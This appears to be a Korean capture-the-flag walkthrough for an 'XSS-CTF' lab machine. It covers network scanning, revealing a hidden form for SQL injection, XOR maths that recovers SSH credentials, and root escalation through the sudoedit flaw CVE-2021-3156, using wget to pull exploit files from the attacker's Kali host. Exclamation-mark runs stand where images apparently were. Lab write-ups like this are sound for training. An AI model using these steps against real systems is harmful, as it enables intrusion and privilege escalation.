# XSS-CTF
2025-04-18 XSS-CTF  Walkthrough

네트워크 1-브리지 2-호스트

kali: 192.168.56.105
victim:192.168.56.143

nmap 192.168.56.0/24

nmap -A -sS -sC -p- 192.168.56.143


kali firefox에서 http://192.168.56.143 접속	//apache2 기본 페이지


## Scan

```
gobuster dir -u http://[xss-ctf ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,bak
```
/index.php  /index.html  /list.php  /add.php

## /index.php

!!!!!!!
들어가보았지만 Not Found가 뜬다. 그래서 web source페이지를 보았다.

!!!!!!!

/H10000.txt
!!!!!!!!
H10000 값


## /list.php

index.php에서 Not Found가 떠서 list.php를 들어가면 다음과 같은 글이 작성되어있다

!!!!!!!!!
M1,M2,M3,M4 값이 중요하기 때문에 복붙

1번 게시글 삭제 후 /index.php 를 다시 들어가면 정상적인 페이지가 뜬다는 것을 확인할 수 있다
!!!!!!!!!!
!!!!!!!!!!

## /add.php

http://192.168.56.143/add.php에서 View Source Code를 들어가서 보면 쿼리 작성폼이라는 주석이있는 줄에 쿼리 작성 폼과 ID 조회하는 코드에 type=”hidden”이 되어 있는 것을 알 수 있다.

!!!!!!!!!!

개발자 도구 -F12
<!- -MySQL 쿼리 입력 폼 -- > 주석 확인
type=”hidden” 2개 확인 가능

!!!!!!!!!!!!!!!!!!!!!

type=”hidden” 삭제

type=”hidden” -> type=”submit” 변경


Mysql 쿼리 입력 부분 출력됨
!!!!!!!!!!!!!!!!!!!!!!!!

SQL Injection 공격 가능 – userID DB 확인 가능
!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!

## XOR 연산

XOR 변환기 http://kor.pe.kr/util/4/xor_convert.htm

/list.php 에서 얻은 M1,M2,M3,M4 값과 /H10000 에서 얻은 H10000 값으로 XOR 연산

이 과정은 총 2가지로 풀 수 있다.

1번 방법: 

192.168.56.143/index.php에서 다음과 같은 식을 제공하였다. 이때 P=Password다. 

M1=userID ⨁ K ⨁ H9999

M2=serverID ⨁ K ⨁ H9999 

M3=H10000 ⨁ P

M4=H9999 ⨁ 

P=H10000⨁M3를 통해 Password=df93ef64167b2334664ff59a5b8185f5값을 구하면 M4를 통해 H9999를 구할 수 있다. H9999=M4⨁P 이후 M1을 이용하여 K를 구할 수 있다. 이때 UserID는 위의 SQL Injection으로 찾아낸 UserID 중 하나씩 다 대입하면 UserID=Ocean777Timewarp를 넣어서 계산하다보면 그럴듯한 K=secretpassword12값이 나온다. 그 다음 M2에서 serverID=M2⨁H9999를 구할 수 있다. serverID=cr0sss1tescr1pt9 이제 서버의 ID와 Password를 전부 찾았다.

2방법: 

M1=userID ⨁ K ⨁ H9999

M2=serverID ⨁ K ⨁ H9999 

M3=H10000 ⨁ P

M4=H9999 ⨁ P

P=H10000⨁M3를 통해 Password=df93ef64167b2334664ff59a5b8185f5를 구한 후 M1⨁M2=userID⨁serverID가 나오고 SQL Injection으로 찾아낸 userID를 하나씩 대입하면 serverID= cr0sss1tescr1pt9가 나온다. 이렇게 하면 굳이 H9999값과 K값을 구하지 않아도 ServerID값을 구할 수 있다.


## SSH 접속

userID :
cr0sss1tescr1pt9

password :
df93ef64167b2334664ff59a5b8185f5

!!!!!!!!!!!!!!!!!!!!!!!!!!


## User Flag

!!!!!!!!!!!!!!


## Root Flag

root로 권한 상승 - sudoedit
!!!!!!!!!!!!!!!!

https://github.com/blasty/CVE-2021-3156  참조

- brute.sh , hax.c , lib.c 파일 생성

cr0sss1tescr1pt9 사용자는 vi,vim,nano 사용할 수 없다.

kali-root 계정에서 /var/www/html/ 디렉터리에 파일 생성 후, cr0sss1tescr1pt9 사용자 계정에서 wget으로 파일을 다운로드한다.
```
wget http://[kali ip]/brute.sh
```
```
wget http://[kali ip]/hax.c
```
```
wget http://[kali ip]/lib.c
```

https://github.com/blasty/CVE-2021-3156 - Makefile 참고
!!!!!!!!!!!!!!!







